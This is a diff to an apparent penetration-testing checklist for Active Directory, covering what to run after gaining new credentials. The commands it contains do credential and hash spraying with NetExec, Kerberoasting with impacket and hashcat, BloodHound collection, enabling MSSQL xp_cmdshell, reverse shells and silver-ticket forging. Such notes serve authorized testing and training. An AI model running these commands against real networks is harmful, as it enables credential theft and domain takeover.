@@ -3,7 +3,7 @@
 **Use this checklist when you get NEW credentials or find a NEW password.**
 Test everything systematically with NetExec to avoid missing access.
 
-## Whenever You Get New Credentials (ALWAYS RUN THIS)
+## Whenever You Get New Credentials 
 
 ### Test Credential Validity Across Protocols
 - SMB
@@ -27,22 +27,23 @@ Test everything systematically with NetExec to avoid missing access.
 - [ ] Enumerate domain users: `netexec smb <DC-IP> -u <user> -p '<password>' --users`
 - [ ] Enumerate domain groups: `netexec smb <DC-IP> -u <user> -p '<password>' --groups`
 - [ ] Check user privileges: `netexec smb <targets> -u <user> -p '<password>' --local-groups`
+- [ ] 
 
-## Kerberoasting (HIGH PRIORITY - Always Try)
+## Kerberoasting 
 
 - [ ] Find SPN users from Linux: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request`
 - [ ] Save hashes: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile kerberoast.hash`
 - [ ] Crack immediately: `hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt`
 - [ ] If cracked, **GO BACK TO TOP** and test new credentials
 
-## BloodHound Collection (CRITICAL - Don't Skip)
+## BloodHound Collection 
 
 - [ ] [[Active Directory#Run SharpHound|Run SharpHound]]
 - [ ] Upload to BloodHound and analyze
 - [ ] Check "Shortest Path to Domain Admins" from owned user
 - [ ] Mark compromised users as "Owned" in BloodHound
 
-## Hash-Based Authentication (If You Have NTLM Hash)
+## Hash-Based Authentication 
 
 - [ ] Test hash via SMB: `netexec smb <targets> -u <user> -H <hash>`
 - [ ] Test hash via WinRM: `netexec winrm <targets> -u <user> -H <hash>`
@@ -67,16 +68,9 @@ Then continue domain enumeration:
 - [ ] Try to enable xp_cmdshell: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
 - [ ] Execute commands: `xp_cmdshell 'whoami'`
 - [ ] Get reverse shell if xp_cmdshell works
+- [ ] Forge silver ticket if possible to impersonate Administrator and enable xp_cmdshell
 
 ## Common Pitfalls
-
-**If stuck, did you:**
-- Test new credentials on ALL hosts (not just DC)?
-- Try `--local-auth` flag for local admin passwords?
-- Run Kerberoast and start cracking in background?
-- Collect BloodHound data and actually analyze it?
-- Check PowerShell history on EVERY machine you access?
-- Test passwords found in history across all machines?
 
 ## Reference
 
